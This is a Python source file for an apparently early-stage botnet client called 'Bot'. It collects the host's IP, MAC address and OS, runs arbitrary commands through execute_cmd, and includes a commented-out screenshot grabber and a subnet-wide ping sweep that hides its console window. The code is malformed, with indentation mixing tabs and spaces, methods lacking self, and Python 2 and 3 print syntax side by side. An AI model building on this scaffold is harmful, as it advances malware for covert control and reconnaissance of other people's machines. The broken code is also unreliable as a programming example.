import socket
import platform
import sys
# import pyscreenshot as ImageGrab
from uuid import getnode as get_mac
import subprocess
from subprocess import call


class Bot:
    id = 0
    ip = socket.gethostbyname(socket.gethostname())
    mac = hex(get_mac())
    os = platform.platform()
    im = ''
    count = 0

    def handle_file(self, ip):
        print("test")

    def execute_cmd(self, cmd):
        call(cmd)

    def push_file(self, test):
        print("test")

   # def screen_shot(self):
      #   im = ImageGrab.grab()
       #  im.save('screen shot%d.png' % self.count)
       #  self.count += 1

    def scan(self):
        print("scan")

    def sleep(self):
        print("sleep")

	def oct_0(ip_list_0, host_num_0, net_id_arr_0):

		host_num_0 = host_num_0/(256*256*256)
		oct_1(ip_list_0, (256*256*256), net_id_arr_0)

		for i in range(host_num_0 - 1):

			temp = int(net_id_arr_0[0])
			temp += 1
			net_id_arr_0[0] = str(temp)

			net_id_arr_0[1] = "0"
			net_id_arr_0[2] = "0"
			net_id_arr_0[3] = "0"

			oct_1(ip_list_0, (256*256*256), net_id_arr_0)

		return ip_list_0

	def oct_1(ip_list_1, host_num_1, net_id_arr_1):

		host_num_1 = host_num_1/(256*256) #e.g. for /14 will be 4
		oct_2(ip_list_1, (256*256), net_id_arr_1)

		for i in range(host_num_1 - 1):

			temp = int(net_id_arr_1[1])
			temp += 1
			net_id_arr_1[1] = str(temp)

			net_id_arr_1[2] = "0"
			net_id_arr_1[3] = "0"


			oct_2(ip_list_1, (256*256), net_id_arr_1)

		return ip_list_1


	def oct_2(ip_list_2, host_num_2, net_id_arr_2):

		host_num_2 = host_num_2/256 #e.g. for /22 will be 4
		oct_3(ip_list_2, 256, net_id_arr_2)

		for i in range(host_num_2 - 1):

			temp = int(net_id_arr_2[2])
			temp += 1
			net_id_arr_2[2] = str(temp)

			net_id_arr_2[3] = "0"

			oct_3(ip_list_2, 256, net_id_arr_2)

		return ip_list_2


	def oct_3(ip_list_3, host_num_3, net_id_arr_3):

		ip_list_3.append('.'.join(net_id_arr_3))

		for i in range(host_num_3 - 1):

			temp = int(net_id_arr_3[3])
			temp += 1
			net_id_arr_3[3] = str(temp)
			ip_list_3.append('.'.join(net_id_arr_3))

		return ip_list_3


	def do_scan(addr):

		#Parse input
		ip,mask = addr.split("/")

		#Error checking for valid mask & network ID
		if not(1 <= int(mask) <= 32):
			print "Error - incorrect input: invalid subnet mask"
			sys.exit()

		ip_arr = ip.split(".")

		for i in ip_arr:
			i = int(i)
			if not (0 <= i <= 255):
				print "Error - incorrect input: invalid IP address"
				sys.exit()


		#Figure out how many hosts
		net_bits = 32 - int(mask)
		net_hosts = pow(2, net_bits)
		all_hosts = list()

		#Depending on how many octets are affected, call and do enumeration operation(s)
		if (16777216 <= net_hosts <= 2147483648):
			all_hosts = oct_0(all_hosts, net_hosts, ip_arr)

		if (65537 <= net_hosts <= 16777216):
			all_hosts = oct_1(all_hosts, net_hosts, ip_arr)

		elif (257 <= net_hosts <= 65536):
			all_hosts = oct_2(all_hosts, net_hosts, ip_arr)

		elif (1 <= net_hosts <= 256):
			all_hosts = oct_3(all_hosts, net_hosts, ip_arr)
		else:
			print "Calculation error: exiting..."
			sys.exit()

		# Configure subprocess to hide the console window
		info = subprocess.STARTUPINFO()
		info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
		info.wShowWindow = subprocess.SW_HIDE

		# For each IP address in the subnet,
		# run the ping command with subprocess.popen interface
		for i in range(len(all_hosts)):
			output = subprocess.Popen(['ping', '-n', '1', '-w', '500', str(all_hosts[i])], stdout=subprocess.PIPE, startupinfo=info).communicate()[0]

			if "Destination host unreachable" in output.decode('utf-8'):
				print(str(all_hosts[i]), "is Offline")
			elif "Request timed out" in output.decode('utf-8'):
				print(str(all_hosts[i]), "is Offline")
			else:
				print(str(all_hosts[i]), "is Online")

		
		

###### IT'S ALL TESTING FROM HERE ######

bot1 = Bot()

# print("IP: ", bot1.ip)
# print("MAC: ", bot1.mac)
# print("OS: ", bot1.os)
# bot1.screen_shot()
# bot1.execute_cmd("ls")
